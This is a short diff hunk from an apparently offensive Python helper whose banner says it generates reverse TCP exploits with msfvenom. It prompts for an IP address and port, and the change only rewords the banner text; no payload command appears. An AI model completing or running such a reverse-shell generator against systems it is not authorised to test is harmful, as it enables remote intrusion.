@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Controller
 import pyperclip
 
 keyboard = Controller()
-print("(!) This script allows you to rapidly generate reverse_tcp exploits via msfvenom.")
+print("(!) This script allows you to rapidly generate Reverse TCP exploits via msfvenom.")
 ipAddress = raw_input("(?) What is your desired IP address? ")
 print("-" * 60)
 port = raw_input("(?) What is your desired Port? ")
